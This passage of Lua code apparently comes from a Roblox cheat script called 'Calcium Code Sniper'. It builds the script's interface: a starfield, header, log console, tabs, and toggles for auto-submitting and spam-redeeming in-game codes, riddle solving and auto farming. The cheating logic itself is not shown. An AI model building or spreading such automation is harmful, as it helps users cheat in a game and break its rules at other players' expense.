            local h = math.max(1, ogLayer.frame.AbsoluteSize.Y)
            local w = math.max(1, ogLayer.frame.AbsoluteSize.X)
            for _, s in ipairs(ogLayer.pool) do
                local fr = s.frame
                if fr and fr.Parent then
                    local x = fr.Position.X.Offset + s.drift * dtEff
                    local y = fr.Position.Y.Offset + s.speed * dtEff
                    if y > h + 8 then
                        y = -6 - math.random() * 20
                        x = math.random() * w
                        s.speed = 12 + math.random() * 38
                        s.drift = (math.random() - 0.5) * 18
                    end
                    if x < -8 then x = w + 2 end
                    if x > w + 8 then x = -2 end
                    fr.Position = UDim2.fromOffset(x, y)
                    s.twinkle = s.twinkle + dtEff * s.twSpeed
                    fr.BackgroundTransparency = 0.12 + (math.sin(s.twinkle) * 0.5 + 0.5) * 0.6
                end
            end
        end
    end)
end

do
    local MainStarLayer = Instance.new("Frame")
    MainStarLayer.Name = "MainStarLayer"
    MainStarLayer.Size = UDim2.new(1, 0, 1, 0)
    MainStarLayer.BackgroundTransparency = 1
    MainStarLayer.ZIndex = 2
    MainStarLayer.ClipsDescendants = true
    MainStarLayer.Active = false
    MainStarLayer.Parent = Window

    local pool = {}
    local STAR_COUNT = 16
    for i = 1, STAR_COUNT do
        local star = Instance.new("Frame")
        star.Name = "FxStar" .. i
        star.BorderSizePixel = 0
        local sz = (i % 4 == 0) and (3 + math.random(0, 2)) or (1 + math.random(0, 2))
        star.Size = UDim2.fromOffset(sz, sz)
        star.BackgroundColor3 = (i % 5 == 0)
            and Color3.fromRGB(255, 210, 140)
            or Color3.fromRGB(160 + math.random(0, 40), 200 + math.random(0, 40), 255)
        star.BackgroundTransparency = 0.15 + math.random() * 0.5
        star.Position = UDim2.fromOffset(math.random(0, 290), math.random(-20, 480))
        star.ZIndex = 2
        star.Parent = MainStarLayer
        addCorner(star, 8)
        pool[i] = {
            frame = star,
            speed = 12 + math.random() * 38,
            drift = (math.random() - 0.5) * 18,
            twinkle = math.random() * math.pi * 2,
            twSpeed = 2 + math.random() * 3,
        }
    end

    _G.CalciumPulseRefs.mainStars = {
        layer = MainStarLayer,
        pool = pool,
    }
end

local WindowScrim = Instance.new("Frame")
WindowScrim.Name = "ReadabilityScrim"
WindowScrim.Size = UDim2.new(1, 0, 1, 0)
WindowScrim.BackgroundColor3 = Color3.fromRGB(6, 10, 18)
WindowScrim.BackgroundTransparency = 0.72
WindowScrim.BorderSizePixel = 0
WindowScrim.ZIndex = 2
WindowScrim.Parent = Window
addCorner(WindowScrim, 14)

local InterfaceScale = Instance.new("UIScale")
InterfaceScale.Name = "InterfaceScale"
InterfaceScale.Scale = 0.92
InterfaceScale.Parent = Window

local viewportConnection
function updateInterfaceScale()
    local camera = workspace.CurrentCamera
    local viewport = (camera and camera.ViewportSize) or Vector2.new(1280, 720)
    local baseW, baseH = 300, 560
    local fit = math.min((viewport.X - 20) / baseW, (viewport.Y - 24) / baseH)
    local touch = UserInputService.TouchEnabled
    local gamepad = UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled
    local scale
    if touch then
        if viewport.X <= 500 then
            scale = math.clamp(fit * 0.98, 0.55, 0.82)
        elseif viewport.X <= 900 then
            scale = math.clamp(fit * 0.95, 0.62, 0.88)
        else
            scale = math.clamp(fit * 0.92, 0.7, 0.95)
        end
    elseif gamepad then
        scale = math.clamp(fit * 0.9, 0.75, 1)
    else
        scale = math.clamp(math.min(fit, 1.05), 0.85, 1.08)
    end
    InterfaceScale.Scale = scale
end

function watchViewport()
    if viewportConnection then viewportConnection:Disconnect(); viewportConnection = nil end
    local camera = workspace.CurrentCamera
    if camera then viewportConnection = camera:GetPropertyChangedSignal("ViewportSize"):Connect(updateInterfaceScale) end
    updateInterfaceScale()
end
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(watchViewport)
watchViewport()

local Header = Instance.new("Frame")
Header.Name = "Header"
Header.Size = UDim2.new(1, 0, 0, 70)
Header.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
Header.BackgroundTransparency = 0.35
Header.BorderSizePixel = 0
Header.Active = true
Header.ZIndex = 5
Header.Parent = Window
addCorner(Header, 12)
do
    local hs = Instance.new("UIStroke")
    hs.Color = COLORS.Accent
    hs.Thickness = 1
    hs.Transparency = 0.75
    hs.Parent = Header
end

local Console, ConsoleOutput, updateConsoleCanvas
local featureStates = {}
local CONSOLE_COLORS = {
    Dim = "rgb(150,170,200)",
    Amber = "rgb(120,200,255)",
    Green = "rgb(80,230,160)",
    Red = "rgb(255,100,120)",
    Cyan = "rgb(140,220,255)",
    Gold = "rgb(255,210,110)",
    Magenta = "rgb(220,140,255)",
    Tag = "rgb(90,120,160)",
}

function scrollConsoleToBottom()
    task.defer(function()
        task.wait()
        if not Console then return end
        if updateConsoleCanvas then updateConsoleCanvas() end
        local canvasY = Console.AbsoluteCanvasSize.Y
        local windowY = Console.AbsoluteWindowSize.Y
        local bottom = math.max(0, canvasY - windowY)
        local nearBottom = (Console.CanvasPosition.Y >= bottom - 40) or bottom <= 0
        if nearBottom then
            Console.CanvasPosition = Vector2.new(0, bottom)
        end
    end)
end

function appendConsoleStatus(name, activated)
    if not ConsoleOutput then return end
    local state = activated and "ON" or "OFF"
    local stateColor = activated and CONSOLE_COLORS.Green or CONSOLE_COLORS.Red
    local t = os.date("*t")
    local ts = string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
    local line = table.concat({
        '<font color="', CONSOLE_COLORS.Tag, '">', ts, '</font> ',
        '<font color="', CONSOLE_COLORS.Cyan, '">[CFG]</font> ',
        '<font color="', CONSOLE_COLORS.Amber, '">', tostring(name), '</font> ',
        '<font color="', CONSOLE_COLORS.Dim, '">→</font> ',
        '<font color="', stateColor, '">', state, '</font>',
    })
    if ConsoleOutput.Text == "" then ConsoleOutput.Text = line
    else ConsoleOutput.Text = ConsoleOutput.Text .. "\n" .. line end
    scrollConsoleToBottom()
end

makeLabel(Header, "Title", "CALCIUM", UDim2.fromOffset(120, 18), UDim2.fromOffset(16, 6), 16, COLORS.White, Enum.Font.GothamBlack)
makeLabel(Header, "Subtitle", "CODE SNIPER", UDim2.fromOffset(120, 12), UDim2.fromOffset(16, 24), 11, COLORS.Accent, Enum.Font.GothamBold)

local ExecPulseDot = Instance.new("Frame")
ExecPulseDot.Name = "ExecPulseDot"
ExecPulseDot.Size = UDim2.fromOffset(6, 6)
ExecPulseDot.Position = UDim2.fromOffset(16, 45)
ExecPulseDot.BackgroundColor3 = COLORS.Green
ExecPulseDot.BorderSizePixel = 0
ExecPulseDot.ZIndex = 6
ExecPulseDot.Parent = Header
addCorner(ExecPulseDot, 3)
_G.CalciumPulseRefs.execDot = ExecPulseDot

local ExecNameLabel = makeLabel(Header, "ExecName", tostring(EXECUTOR_NAME), UDim2.new(1, -150, 0, 12), UDim2.fromOffset(28, 41), 10, COLORS.White, Enum.Font.GothamBold)
ExecNameLabel.TextXAlignment = Enum.TextXAlignment.Left
ExecNameLabel.TextTruncate = Enum.TextTruncate.AtEnd
ExecNameLabel.ZIndex = 6

local DateTimeLabel = Instance.new("TextLabel")
DateTimeLabel.Name = "DateTime"
DateTimeLabel.Size = UDim2.new(0, 130, 0, 12)
DateTimeLabel.Position = UDim2.new(1, -134, 0, 41)
DateTimeLabel.BackgroundTransparency = 1
DateTimeLabel.Text = os.date("%H:%M:%S  ·  %d/%m/%Y")
DateTimeLabel.TextSize = 10
DateTimeLabel.TextColor3 = COLORS.Dim
DateTimeLabel.Font = Enum.Font.GothamMedium
DateTimeLabel.TextXAlignment = Enum.TextXAlignment.Right
DateTimeLabel.ZIndex = 6
DateTimeLabel.Parent = Header

task.spawn(function()
    while DateTimeLabel and DateTimeLabel.Parent do
        pcall(function()
            DateTimeLabel.Text = os.date("%H:%M:%S  ·  %d/%m/%Y")
        end)
        task.wait(0.5)
    end
end)

local AvatarImage = Instance.new("ImageLabel")
AvatarImage.Name = "PlayerHeadshot"
AvatarImage.Size = UDim2.fromOffset(34, 34)
AvatarImage.Position = UDim2.new(1, -42, 0, 4)
AvatarImage.BackgroundColor3 = COLORS.Control
AvatarImage.BorderSizePixel = 0
AvatarImage.ZIndex = 5
AvatarImage.ScaleType = Enum.ScaleType.Crop
AvatarImage.Parent = Header
addCorner(AvatarImage, 17)
addStroke(AvatarImage, COLORS.Accent, 1.2, 0.35)

task.spawn(function()
    local uid = player.UserId
    local ok, content = pcall(function()
        return Players:GetUserThumbnailAsync(uid, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
    end)
    if ok and content and AvatarImage then
        AvatarImage.Image = content
    elseif AvatarImage then
        AvatarImage.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(uid) .. "&width=48&height=48&format=png"
    end
end)

local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Name = "Minimize"
MinimizeButton.Size = UDim2.fromOffset(24, 24)
MinimizeButton.Position = UDim2.new(1, -72, 0, 10)
MinimizeButton.BackgroundColor3 = COLORS.Control
MinimizeButton.BorderSizePixel = 0
MinimizeButton.AutoButtonColor = false
MinimizeButton.Text = "–"
MinimizeButton.TextSize = 16
MinimizeButton.TextColor3 = COLORS.White
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.ZIndex = 5
MinimizeButton.Parent = Header
addCorner(MinimizeButton, 6)
addStroke(MinimizeButton, COLORS.Border, 1, 0.5)

local AutoWriteButton = Instance.new("TextButton")
AutoWriteButton.Name = "AutoWrite"
AutoWriteButton.Size = UDim2.fromOffset(47, 24)
AutoWriteButton.Position = UDim2.new(1, -124, 0, 10)
AutoWriteButton.BackgroundColor3 = COLORS.Accent
AutoWriteButton.BorderSizePixel = 0
AutoWriteButton.AutoButtonColor = false
AutoWriteButton.Active = true
AutoWriteButton.Text = ""
AutoWriteButton.ZIndex = 5
AutoWriteButton.Parent = Header
addCorner(AutoWriteButton, 12)

local AutoWriteStroke = addStroke(AutoWriteButton, COLORS.White, 1, 0.62)
local AutoWriteKnob = Instance.new("Frame")
AutoWriteKnob.Name = "Knob"
AutoWriteKnob.Size = UDim2.fromOffset(20, 20)
AutoWriteKnob.Position = UDim2.new(1, -22, 0.5, -10)
AutoWriteKnob.BackgroundColor3 = COLORS.Window
AutoWriteKnob.BorderSizePixel = 0
AutoWriteKnob.ZIndex = 6
AutoWriteKnob.Parent = AutoWriteButton
addCorner(AutoWriteKnob, 10)

local autoWriteEnabled = (savedConfig.codeSniper ~= false)
_enabled = autoWriteEnabled

AutoWriteButton.BackgroundColor3 = autoWriteEnabled and COLORS.Accent or COLORS.Control
AutoWriteStroke.Transparency = autoWriteEnabled and 0.62 or 0.88
AutoWriteKnob.BackgroundColor3 = autoWriteEnabled and COLORS.Window or COLORS.White
AutoWriteKnob.Position = autoWriteEnabled and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10)

local lastToggleTime = 0
function toggleAutoWrite()
    if tick() - lastToggleTime < 0.08 then return end
    lastToggleTime = tick()

    autoWriteEnabled = not autoWriteEnabled
    _enabled = autoWriteEnabled
    if not autoWriteEnabled and clearCalciumCapture then clearCalciumCapture() end
    savedConfig.codeSniper = autoWriteEnabled
    saveConfig()
    _lastStatusMsg = nil

    local ti = TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    TweenService:Create(AutoWriteButton, ti, {
        BackgroundColor3 = autoWriteEnabled and COLORS.Accent or COLORS.Control
    }):Play()
    TweenService:Create(AutoWriteStroke, ti, {
        Transparency = autoWriteEnabled and 0.62 or 0.88
    }):Play()
    TweenService:Create(AutoWriteKnob, ti, {
        BackgroundColor3 = autoWriteEnabled and COLORS.Window or COLORS.White,
        Position = autoWriteEnabled
            and UDim2.new(1, -22, 0.5, -10)
            or  UDim2.new(0,   2, 0.5, -10),
    }):Play()

    if ConsoleOutput then
        if autoWriteEnabled then
            ConsoleOutput.Text = '<font color="' .. CONSOLE_COLORS.Tag .. '">◈</font> <font color="' .. CONSOLE_COLORS.Amber .. '">SCOPE LIVE</font> <font color="' .. CONSOLE_COLORS.Dim .. '">· waiting for targets...</font>'
            for _, featureName in ipairs({"Auto submit", "Riddle solver", "Retype invalid", "Auto farm", "OG Sniper"}) do
                if featureStates[featureName] then appendConsoleStatus(featureName, true) end
            end
        else
            ConsoleOutput.Text = '<font color="' .. CONSOLE_COLORS.Tag .. '">◈</font> <font color="' .. CONSOLE_COLORS.Red .. '">SCOPE DOWN</font>\n<font color="' .. CONSOLE_COLORS.Dim .. '">sniper paused — CODE IS still armed</font>'
        end
        scrollConsoleToBottom()
    end
end

AutoWriteButton.Activated:Connect(toggleAutoWrite)
AutoWriteButton.MouseButton1Click:Connect(toggleAutoWrite)

local HeaderAccent = Instance.new("Frame")
HeaderAccent.Name = "TitleDivider"
HeaderAccent.Size = UDim2.new(1, -34, 0, 1)
HeaderAccent.Position = UDim2.fromOffset(17, 62)
HeaderAccent.BackgroundColor3 = COLORS.Accent
HeaderAccent.BackgroundTransparency = 0.55
HeaderAccent.BorderSizePixel = 0
HeaderAccent.Parent = Header
_G.CalciumPulseRefs.headerAccent = HeaderAccent

Console = Instance.new("ScrollingFrame")
Console.Name = "Console"
Console.Size = UDim2.new(1, -28, 0, 96)
Console.Position = UDim2.fromOffset(14, 82)
Console.BackgroundColor3 = Color3.fromRGB(6, 10, 18)
Console.BackgroundTransparency = 0.22
Console.BorderSizePixel = 0
Console.ClipsDescendants = true
Console.Active = true
Console.ScrollingEnabled = true
Console.ScrollingDirection = Enum.ScrollingDirection.Y
Console.ElasticBehavior = Enum.ElasticBehavior.Always
Console.VerticalScrollBarInset = Enum.ScrollBarInset.Always
Console.CanvasSize = UDim2.new(0, 0, 0, 120)
Console.AutomaticCanvasSize = Enum.AutomaticSize.Y
Console.ScrollBarThickness = 5
Console.ScrollBarImageColor3 = Color3.fromRGB(120, 190, 255)
Console.ScrollBarImageTransparency = 0.25
Console.ZIndex = 3
Console.Parent = Window
addCorner(Console, 10)

local ConsoleStroke = addStroke(Console, Color3.fromRGB(100, 170, 255), 1, 0.55)
_G.CalciumPulseRefs.consoleStroke = ConsoleStroke

local ConsolePulse = Instance.new("TextLabel")
ConsolePulse.Name = "PulseGlyph"
ConsolePulse.Size = UDim2.fromOffset(16, 14)
ConsolePulse.Position = UDim2.fromOffset(22, 87)
ConsolePulse.BackgroundTransparency = 1
ConsolePulse.Text = "◈"
ConsolePulse.TextSize = 13
ConsolePulse.Font = Enum.Font.GothamBold
ConsolePulse.TextColor3 = Color3.fromRGB(120, 200, 255)
ConsolePulse.TextStrokeColor3 = Color3.fromRGB(40, 120, 255)
ConsolePulse.TextStrokeTransparency = 0.5
ConsolePulse.ZIndex = 12
ConsolePulse.Parent = Window
_G.CalciumPulseRefs.consolePulse = ConsolePulse

ConsoleOutput = Instance.new("TextLabel")
ConsoleOutput.Name = "ConsoleOutput"
ConsoleOutput.Size = UDim2.new(1, -22, 0, 0)
ConsoleOutput.AutomaticSize = Enum.AutomaticSize.Y
ConsoleOutput.Position = UDim2.fromOffset(9, 6)
ConsoleOutput.BackgroundTransparency = 1
ConsoleOutput.RichText = true
if autoWriteEnabled then
    ConsoleOutput.Text = '<font color="' .. CONSOLE_COLORS.Tag .. '">◈</font> <font color="' .. CONSOLE_COLORS.Amber .. '">SCOPE LIVE</font> <font color="' .. CONSOLE_COLORS.Dim .. '">· waiting for targets...</font>'
else
    ConsoleOutput.Text = '<font color="' .. CONSOLE_COLORS.Tag .. '">◈</font> <font color="' .. CONSOLE_COLORS.Red .. '">SCOPE DOWN</font>\n<font color="' .. CONSOLE_COLORS.Dim .. '">sniper paused — CODE IS still armed</font>'
end
ConsoleOutput.TextSize = 13
ConsoleOutput.Font = Enum.Font.GothamMedium
ConsoleOutput.TextColor3 = Color3.fromRGB(240, 245, 255)
ConsoleOutput.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
ConsoleOutput.TextStrokeTransparency = 0.45
ConsoleOutput.TextXAlignment = Enum.TextXAlignment.Left
ConsoleOutput.TextYAlignment = Enum.TextYAlignment.Top
ConsoleOutput.TextWrapped = true
ConsoleOutput.ZIndex = 4
ConsoleOutput.Parent = Console

local CONSOLE_BOTTOM_PADDING = 30
updateConsoleCanvas = function()
    if not Console or not ConsoleOutput then return end
    local h = ConsoleOutput.TextBounds.Y
    if h < 1 then h = ConsoleOutput.AbsoluteSize.Y end
    local contentHeight = math.max(Console.AbsoluteWindowSize.Y + 1, ConsoleOutput.Position.Y.Offset + h + CONSOLE_BOTTOM_PADDING)
    Console.CanvasSize = UDim2.new(0, 0, 0, contentHeight)
end
ConsoleOutput:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateConsoleCanvas)
task.defer(updateConsoleCanvas)

local ClearLogsBtn = Instance.new("TextButton")
ClearLogsBtn.Name = "ClearLogs"
ClearLogsBtn.Size = UDim2.fromOffset(52, 18)
ClearLogsBtn.Position = UDim2.new(1, -58, 0, 4)
ClearLogsBtn.BackgroundColor3 = COLORS.Control
ClearLogsBtn.BorderSizePixel = 0
ClearLogsBtn.AutoButtonColor = false
ClearLogsBtn.Active = true
ClearLogsBtn.Text = "Clear"
ClearLogsBtn.TextSize = 10
ClearLogsBtn.TextColor3 = COLORS.White
ClearLogsBtn.Font = Enum.Font.GothamBold
ClearLogsBtn.ZIndex = 6
ClearLogsBtn.Parent = Console
addCorner(ClearLogsBtn, 5)
addStroke(ClearLogsBtn, COLORS.Border, 1, 0.55)

local lastClearTime = 0
function clearLogs()
    if tick() - lastClearTime < 0.2 then return end
    lastClearTime = tick()
    _capturedParts = {}
    if type(clearCalciumCapture) == "function" then
        pcall(clearCalciumCapture)
    end
    pcall(function()
        local box = (_cachedBox and _cachedBox.Parent) and _cachedBox or (type(calciumCodeBox) == "function" and calciumCodeBox())
        if box then
            _writingCodeBox = true
            box.Text = ""
            _writingCodeBox = false
        end
    end)
    if type(refreshMiniView) == "function" then pcall(refreshMiniView) end
    if not ConsoleOutput then return end
    if autoWriteEnabled then
        ConsoleOutput.Text = '<font color="' .. CONSOLE_COLORS.Tag .. '">◈</font> <font color="' .. CONSOLE_COLORS.Amber .. '">CLEARED</font> <font color="' .. CONSOLE_COLORS.Dim .. '">· buffer reset · waiting...</font>'
    else
        ConsoleOutput.Text = '<font color="' .. CONSOLE_COLORS.Tag .. '">◈</font> <font color="' .. CONSOLE_COLORS.Red .. '">CLEARED</font>\n<font color="' .. CONSOLE_COLORS.Dim .. '">buffer wiped · sniper paused</font>'
    end
    _lastStatusMsg = nil
    scrollConsoleToBottom()
end
ClearLogsBtn.Activated:Connect(clearLogs)
ClearLogsBtn.MouseButton1Click:Connect(clearLogs)

local TabBar = Instance.new("Frame")
TabBar.Name = "TabBar"
TabBar.Size = UDim2.new(1, -34, 0, 28)
TabBar.Position = UDim2.fromOffset(17, 182)
TabBar.BackgroundTransparency = 1
TabBar.ZIndex = 4
TabBar.Parent = Window

function makeTabButton(text, xScale, xOffset)
    local b = Instance.new("TextButton")
    b.Name = "Tab_" .. text
    b.Size = UDim2.new(0.5, -4, 1, 0)
    b.Position = UDim2.new(xScale, xOffset, 0, 0)
    b.BackgroundColor3 = COLORS.Control
    b.BorderSizePixel = 0
    b.AutoButtonColor = false
    b.Text = text
    b.TextSize = 12
    b.TextColor3 = COLORS.Dim
    b.Font = Enum.Font.GothamBold
    b.ZIndex = 5
    b.Parent = TabBar
    addCorner(b, 7)
    local stroke = addStroke(b, COLORS.White, 1, 0.75)
    b.MouseEnter:Connect(function()
        TweenService:Create(stroke, TweenInfo.new(0.15), { Transparency = 0.35 }):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(stroke, TweenInfo.new(0.2), { Transparency = 0.75 }):Play()
    end)
    return b
end

local TabMainBtn = makeTabButton("Main", 0, 0)
local TabKeybindsBtn = makeTabButton("Keybinds", 0.5, 4)

function setTabVisual(active)
    local ti = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local function style(btn, on)
        TweenService:Create(btn, ti, {
            BackgroundColor3 = on and COLORS.Accent or COLORS.Control,
            TextColor3 = on and COLORS.Window or COLORS.Dim,
        }):Play()
    end
    style(TabMainBtn, active == "Main")
    style(TabKeybindsBtn, active == "Keybinds")
end
setTabVisual("Main")

local MainPage = Instance.new("Frame")
MainPage.Name = "MainPage"
MainPage.Size = UDim2.new(1, 0, 0, 352)
MainPage.Position = UDim2.fromOffset(0, 214)
MainPage.BackgroundTransparency = 1
MainPage.ZIndex = 3
MainPage.Visible = true
MainPage.ClipsDescendants = true
MainPage.Parent = Window

local KeybindsPage = Instance.new("Frame")
KeybindsPage.Name = "KeybindsPage"
KeybindsPage.Size = UDim2.new(1, 0, 0, 250)
KeybindsPage.Position = UDim2.fromOffset(0, 214)
KeybindsPage.BackgroundTransparency = 1
KeybindsPage.ZIndex = 3
KeybindsPage.Visible = false
KeybindsPage.ClipsDescendants = true
KeybindsPage.Parent = Window

local function popPage(page)
    local sc = page:FindFirstChildOfClass("UIScale") or Instance.new("UIScale", page)
    sc.Scale = 0.94
    TweenService:Create(sc, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
end

function showTab(name)
    local isMain = name == "Main"
    local showPage = isMain and MainPage or KeybindsPage
    local hidePage = isMain and KeybindsPage or MainPage
    hidePage.Visible = false
    showPage.Visible = true
    popPage(showPage)
    setTabVisual(name)
end

TabMainBtn.Activated:Connect(function() showTab("Main") end)
TabKeybindsBtn.Activated:Connect(function() showTab("Keybinds") end)

local Settings = MainPage

function makeCard(name, position, size, parentOverride)
    local card = Instance.new("Frame")
    card.Name = name
    card.Position = position
    card.Size = size
    card.BackgroundColor3 = Color3.fromRGB(12, 16, 26)
    card.BackgroundTransparency = 0.25
    card.BorderSizePixel = 0
    card.Parent = parentOverride or Settings
    addCorner(card, 9)
    local stroke = addStroke(card, Color3.fromRGB(140, 190, 255), 1, 0.72)

    local baseBg = card.BackgroundColor3
    local baseTrans = card.BackgroundTransparency
    local hoverTi  = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local leaveTi  = TweenInfo.new(0.20, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    card.MouseEnter:Connect(function()
        TweenService:Create(card, hoverTi, {
            BackgroundColor3 = Color3.fromRGB(18, 24, 36),
            BackgroundTransparency = 0.15,
        }):Play()
        if stroke then
            TweenService:Create(stroke, hoverTi, { Transparency = 0.4 }):Play()
        end
    end)
    card.MouseLeave:Connect(function()
        TweenService:Create(card, leaveTi, {
            BackgroundColor3 = baseBg,
            BackgroundTransparency = baseTrans,
        }):Play()
        if stroke then
            TweenService:Create(stroke, leaveTi, { Transparency = 0.72 }):Play()
        end
    end)

    return card
end

function makeStateButton(parent, enabled, consoleName, onToggle, customColor)
    parent.Active = true
    featureStates[consoleName] = enabled
    local button = Instance.new("TextButton")
    button.Name = "State"
    button.Size = UDim2.fromOffset(42, 20)
    button.Position = UDim2.new(1, -50, 0.5, -10)
    button.BackgroundColor3 = enabled and (customColor or COLORS.Accent) or COLORS.Control
    button.BorderSizePixel = 0
    button.AutoButtonColor = false
    button.Active = true
    button.Text = enabled and "ON" or "OFF"
    button.TextSize = 8
    button.TextColor3 = enabled and COLORS.Window or COLORS.Dim
    button.Font = Enum.Font.GothamBold
    button.ZIndex = 5
    button.Parent = parent
    addCorner(button, 6)
    local outline = addStroke(button, COLORS.White, 1, enabled and 0.62 or 0.88)
    local lastSubToggle = 0

    local function applyVisual(state)
        featureStates[consoleName] = state
        button.Text = state and "ON" or "OFF"
        local targetBg   = state and (customColor or COLORS.Accent) or COLORS.Control
        local targetTxt  = state and COLORS.Window or COLORS.Dim
        local targetLine = state and 0.62 or 0.88

        local ti = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(button, ti, {
            BackgroundColor3 = targetBg,
            TextColor3 = targetTxt,
        }):Play()
        TweenService:Create(outline, ti, { Transparency = targetLine }):Play()

        local sc = button:FindFirstChildOfClass("UIScale") or Instance.new("UIScale", button)
        sc.Scale = 0.88
        TweenService:Create(sc, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Scale = 1
        }):Play()
    end

    button:SetAttribute("FeatureName", consoleName)

    local function toggleState()
        if tick() - lastSubToggle < 0.25 then return end
        lastSubToggle = tick()
        local state = not (featureStates[consoleName] == true)
        applyVisual(state)
        if autoWriteEnabled then appendConsoleStatus(consoleName, state) end
        if onToggle then onToggle(state) end
    end

    button.Activated:Connect(toggleState)
    return button
end

local AutoCard = makeCard("AutoSubmit", UDim2.fromOffset(17, 0), UDim2.fromOffset(135, 50))
makeLabel(AutoCard, "Title", "Auto submit", UDim2.new(1, -58, 1, 0), UDim2.fromOffset(12, 0), 11, COLORS.White, Enum.Font.GothamMedium)
makeStateButton(AutoCard, _autoAccept, "Auto submit", function(state)
    _autoAccept = state
    savedConfig.autoSubmit = state
    saveConfig()
end)

local AICard = makeCard("AIRiddles", UDim2.fromOffset(158, 0), UDim2.fromOffset(135, 50))
makeLabel(AICard, "Title", "Riddle solver", UDim2.new(1, -58, 1, 0), UDim2.fromOffset(12, 0), 11, COLORS.White, Enum.Font.GothamMedium)
makeStateButton(AICard, _riddleSolver, "Riddle solver", function(state)
    _riddleSolver = state
    savedConfig.riddleSolver = state
    saveConfig()
end)

local SpamCard = makeCard("SpamRedeem", UDim2.fromOffset(17, 56), UDim2.fromOffset(276, 40))
makeLabel(SpamCard, "Title", "Spam redeem", UDim2.new(1, -58, 1, 0), UDim2.fromOffset(12, 0), 11, COLORS.White, Enum.Font.GothamMedium)
makeStateButton(SpamCard, _spamRedeem, "Spam redeem", function(state)
    _spamRedeem = state
    savedConfig.spamRedeem = state
    saveConfig()
    if setStatus then
        setStatus(state and "Spam redeem ON" or "Spam redeem OFF", state and COLORS.Green or COLORS.Dim)
    end
end, COLORS.Accent)

local DelayCard = makeCard("SubmitAfter", UDim2.fromOffset(17, 102), UDim2.fromOffset(276, 44))
makeLabel(DelayCard, "Title", "Submit after announcements", UDim2.fromOffset(145, 43), UDim2.fromOffset(12, 0), 11, COLORS.White, Enum.Font.GothamMedium)
local CounterShell = Instance.new("Frame")
CounterShell.Name = "Counter"
CounterShell.Size = UDim2.fromOffset(96, 31)
CounterShell.Position = UDim2.new(1, -105, 0.5, -15)
CounterShell.BackgroundColor3 = COLORS.Window
CounterShell.BackgroundTransparency = 0.05
CounterShell.BorderSizePixel = 0
CounterShell.Parent = DelayCard
addCorner(CounterShell, 7)
addStroke(CounterShell, COLORS.White, 1, 0.86)

local Minus = Instance.new("TextButton")
Minus.Name = "Minus"
Minus.Size = UDim2.fromOffset(25, 25)
Minus.Position = UDim2.fromOffset(3, 3)
Minus.BackgroundColor3 = COLORS.Control
Minus.BorderSizePixel = 0
Minus.AutoButtonColor = false
Minus.Active = true
Minus.Text = "-"
Minus.TextSize = 16
Minus.TextColor3 = COLORS.Text
Minus.Font = Enum.Font.GothamBold
Minus.Parent = CounterShell
addCorner(Minus, 5)

local Count = makeLabel(CounterShell, "Count", tostring(_submitAfter), UDim2.fromOffset(28, 25), UDim2.fromOffset(34, 3), 17, COLORS.White, Enum.Font.GothamBold)
Count.TextXAlignment = Enum.TextXAlignment.Center

local Plus = Instance.new("TextButton")
Plus.Name = "Plus"
Plus.Size = UDim2.fromOffset(25, 25)
Plus.Position = UDim2.fromOffset(68, 3)
Plus.BackgroundColor3 = COLORS.Control
Plus.BorderSizePixel = 0
Plus.AutoButtonColor = false
Plus.Active = true
Plus.Text = "+"
Plus.TextSize = 16
Plus.TextColor3 = COLORS.Text
Plus.Font = Enum.Font.GothamBold
Plus.Parent = CounterShell
addCorner(Plus, 5)

function decr()
    _submitAfter = math.max(1, _submitAfter - 1)
    Count.Text = tostring(_submitAfter)
    savedConfig.submitAfter = _submitAfter
    clearCalciumCapture()
    if refreshMiniView then refreshMiniView() end
    saveConfig()
end
function incr()
    _submitAfter = _submitAfter + 1
    Count.Text = tostring(_submitAfter)
    savedConfig.submitAfter = _submitAfter
    clearCalciumCapture()
    saveConfig()
end

local lastCounterTime = 0
function safeDecr()
    if tick() - lastCounterTime < 0.18 then return end
    lastCounterTime = tick()
    decr()
end
function safeIncr()
    if tick() - lastCounterTime < 0.18 then return end
    lastCounterTime = tick()
    incr()
end

Minus.Activated:Connect(safeDecr)
Plus.Activated:Connect(safeIncr)

local RetypeCard = makeCard("RetypeInvalid", UDim2.fromOffset(17, 152), UDim2.fromOffset(276, 38))
makeLabel(RetypeCard, "Title", "Retype invalid", UDim2.new(1, -65, 1, 0), UDim2.fromOffset(12, 0), 11, COLORS.White, Enum.Font.GothamMedium)
local RetypeState = makeStateButton(RetypeCard, _retypeInvalid, "Retype invalid", function(state)
    _retypeInvalid = state
    savedConfig.retypeInvalid = state
    saveConfig()
end)

local FarmCard = makeCard("AutoFarm", UDim2.fromOffset(17, 196), UDim2.fromOffset(276, 38))
makeLabel(FarmCard, "Title", "Auto farm", UDim2.new(1, -58, 1, 0), UDim2.fromOffset(12, 0), 11, COLORS.White, Enum.Font.GothamMedium)
makeStateButton(FarmCard, _autoFarm, "Auto farm", function(state)
    _autoFarm = state
    savedConfig.autoFarm = state
    saveConfig()
    if state then
        pcall(autoBuyStart)
        setStatus("Auto farm ON", COLORS.Gold)
    else
        pcall(autoBuyStop)
        setStatus("Auto farm OFF", COLORS.Dim)
    end
end, COLORS.Gold)

local ManualSubmitBtn = Instance.new("TextButton")
ManualSubmitBtn.Name = "ManualSubmit"
ManualSubmitBtn.Size = UDim2.fromOffset(276, 34)
ManualSubmitBtn.Position = UDim2.fromOffset(17, 240)
